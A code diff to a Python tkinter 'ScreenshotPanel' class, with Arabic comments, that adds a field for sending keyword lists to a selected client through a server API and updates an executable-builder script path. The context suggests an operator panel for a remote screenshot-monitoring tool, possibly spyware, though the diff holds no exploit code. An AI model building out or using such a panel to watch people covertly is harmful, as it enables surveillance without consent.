@@ -222,6 +222,37 @@ class ScreenshotPanel:
         )
         self.info_text.pack(fill=tk.BOTH, expand=True)
         
+        # قسم الكلمات المفتاحية
+        keywords_label = tk.Label(
+            right_frame,
+            text="🔍 الكلمات المفتاحية:",
+            font=("Arial", 10, "bold"),
+            bg="#1e1e1e",
+            fg="#ffff00"
+        )
+        keywords_label.pack(pady=5)
+        
+        keywords_frame = tk.Frame(right_frame, bg="#1e1e1e")
+        keywords_frame.pack(fill=tk.X, padx=5, pady=5)
+        
+        self.keywords_entry = tk.Entry(
+            keywords_frame,
+            bg="#2d2d2d",
+            fg="#ffffff",
+            width=40
+        )
+        self.keywords_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
+        
+        send_keywords_btn = tk.Button(
+            keywords_frame,
+            text="✨ ارسل",
+            bg="#00aa00",
+            fg="white",
+            command=self.send_keywords,
+            padx=10
+        )
+        send_keywords_btn.pack(side=tk.LEFT, padx=5)
+        
         # أزرار التحكم
         buttons_frame = tk.Frame(right_frame, bg="#1e1e1e")
         buttons_frame.pack(fill=tk.X, pady=5)
@@ -743,8 +774,14 @@ Last Seen: {client_info.get('last_seen', 'N/A')}
             
             # استدعاء build_exe_from_config.py
             try:
-                # البحث عن build_exe_from_config_v2.py
-                script_path = Path(__file__).parent / "build_exe_from_config_v2.py"
+                # البحث عن build_exe_from_config_v3.py
+                script_path = Path(__file__).parent / "build_exe_from_config_v3.py"
+                if not script_path.exists():
+                    script_path = Path("build_exe_from_config_v3.py")
+                
+                # fallback إلى v2 إذا لم توجد v3
+                if not script_path.exists():
+                    script_path = Path(__file__).parent / "build_exe_from_config_v2.py"
                 if not script_path.exists():
                     script_path = Path("build_exe_from_config_v2.py")
                 
@@ -755,7 +792,7 @@ Last Seen: {client_info.get('last_seen', 'N/A')}
                     script_path = Path("build_exe_from_config.py")
                 
                 if not script_path.exists():
-                    messagebox.showerror("Error", "build_exe_from_config_v2.py not found!")
+                    messagebox.showerror("Error", "build_exe_from_config_v3.py not found!")
                     return
                 
                 # تشغيل البناء
@@ -801,6 +838,42 @@ Last Seen: {client_info.get('last_seen', 'N/A')}
             except Exception as e:
                 messagebox.showerror("Error", f"Build error: {str(e)}")
         
+        except Exception as e:
+            messagebox.showerror("Error", f"Error: {str(e)}")
+    
+    def send_keywords(self):
+        """إرسال الكلمات المفتاحية إلى العميل"""
+        if not self.selected_client:
+            messagebox.showwarning("Warning", "Please select a client first!")
+            return
+        
+        keywords_text = self.keywords_entry.get().strip()
+        if not keywords_text:
+            messagebox.showwarning("Warning", "Please enter keywords!")
+            return
+        
+        # تقسيم الكلمات
+        keywords = [k.strip() for k in keywords_text.split(",") if k.strip()]
+        
+        try:
+            headers = {"X-API-Key": Config.ADMIN_API_KEY}
+            data = {
+                "client_id": self.selected_client,
+                "keywords": keywords
+            }
+            
+            response = requests.post(
+                f"{Config.SERVER_URL}/api/set_keywords",
+                json=data,
+                headers=headers,
+                timeout=5
+            )
+            
+            if response.status_code == 200:
+                messagebox.showinfo("Success", f"Keywords sent: {', '.join(keywords)}")
+                self.keywords_entry.delete(0, tk.END)
+            else:
+                messagebox.showerror("Error", f"Failed to send keywords: {response.status_code}")
         except Exception as e:
             messagebox.showerror("Error", f"Error: {str(e)}")
     
